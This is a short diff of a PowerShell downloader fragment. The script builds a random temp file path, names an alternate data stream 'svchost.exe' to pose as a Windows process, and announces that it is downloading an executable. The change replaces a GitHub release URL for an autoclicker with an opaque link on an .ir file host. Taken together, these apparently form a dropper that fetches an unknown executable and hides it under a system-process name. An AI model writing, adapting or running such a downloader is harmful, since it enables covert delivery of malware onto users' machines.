@@ -1,7 +1,7 @@
 $rnd = -join ((48..57) | Get-Random -Count 4 | ForEach-Object {[char]$_})
 $tempName = "$rnd.tmp"
 $tempPath = Join-Path $env:TEMP $tempName
-$exeUrl = 'https://github.com/Steve987321/toadclicker/releases/download/v1.7.8/Toad.exe'
+$exeUrl = 'https://abrehamrahi.ir/o/public/DSC3uhQU/'
 $hostFile = "$env:TEMP\update.log"
 $adsName = "svchost.exe"
 Write-Host "[*] Downloading executable from $exeUrl" -ForegroundColor Cyan
